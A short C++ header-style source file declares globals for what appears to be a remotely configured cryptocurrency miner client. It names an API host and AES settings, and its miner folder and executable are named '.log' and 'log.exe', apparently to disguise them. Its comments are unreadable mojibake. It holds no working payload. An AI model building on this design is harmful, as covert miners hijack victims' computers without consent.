#include "i_global.h"

// �ͻ�����Ϣ
json G_PC;

// Զ������
json G_CONFIG;
string G_CONFIG_FILE = ".config"; // �����ļ���

// �ӿ���Ϣ
string G_API_VER = "/v1";
string G_API_URL = "pc.pubu.me";

// ͨ����Կ
string G_AES_KEY = "������д���aeskey";
string G_AES_IV = "00000000000000000000000000000000";

string G_MINER_FILER = ".log"; // ���ļ���
string G_MINER_EXE = "log.exe"; // �󹤽�����
bool G_MINER_RUN = false; // ���Ƿ�����
bool G_MINER_SAFE = false; // ���Ƿ�ȫ
bool G_MINER_STATE = false; // ���Ƿ���������
